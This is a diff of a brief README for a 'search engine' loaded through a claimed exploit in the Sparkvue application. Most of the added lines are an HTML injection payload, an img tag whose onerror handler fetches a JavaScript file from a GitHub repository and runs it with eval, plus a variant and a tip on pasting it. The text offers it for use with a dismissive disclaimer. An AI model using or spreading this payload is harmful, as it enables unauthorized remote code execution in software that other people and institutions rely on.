@@ -3,5 +3,7 @@ This is a simple better UI search engine for the Sparkvue exploit originally fou
 NOTE: I do not consent to your dumb self, if you get this exploit gone. don't come crying to me. Because IDC!
 
 Also thanks to ohonbob for finding this beautiful exploit, and Amurkess for the Idea.
-"<img src=# onerror='fetch("https://github.com/CharlieIsInsane/CharlieSearch/raw/main/Search%20engine.js").then(r=>r.text()).then(c=>eval(c))'>"
+<img src=# onerror='fetch("https://github.com/CharlieIsInsane/CharlieSearch/raw/main/Search%20engine.js").then(r=>r.text()).then(c=>eval(c))'>
+img src=# onerror='fetch("https://github.com/CharlieIsInsane/CharlieSearch/main/Search%20engine.js").then(r=>r.text()).then(c=>eval(c))'
 
+make sure to put the < at the front and > at the back
